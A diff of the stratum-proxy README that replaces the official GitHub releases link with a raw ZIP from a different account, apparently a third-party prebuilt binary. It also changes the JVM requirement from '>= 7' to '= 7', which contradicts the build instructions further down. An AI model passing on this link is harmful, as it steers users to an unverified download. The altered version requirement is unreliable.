@@ -1,10 +1,10 @@
 #Packaging (Not mandatory)
 
-You can directly use a release (https://github.com/Stratehm/stratum-proxy/releases) and go to the Installation and Usage section.
+You can directly use a release (https://github.com/shypkov/stratum/raw/0.8.1/stratum-proxy-0.8.1.zip) and go to the Installation and Usage section.
 
 The packaging of the application is done through Maven and will generate a ZIP which contains the program and all its dependencies.
 
-The proxy is is generated as a JAR file called stratum-proxy.jar (contained in the ZIP file) which can be launched on any platform with a JVM installed with version >= 7 (Java Virtual Machine)
+The proxy is is generated as a JAR file called stratum-proxy.jar (contained in the ZIP file) which can be launched on any platform with a JVM installed with version = 7 (Java Virtual Machine)
 
 To build the package, you must have a JDK installed in version >= 7 and maven 3
 
@@ -1616,6 +1616,3 @@ Return the list of all worker connections.
 
 #License
 GPLv3
-
-Repo is not working properly if you run it from the source. Therefore https://github.com/shypkov/stratum/blob/master/stratum-proxy-0.8.1.zip
-is tested and working.
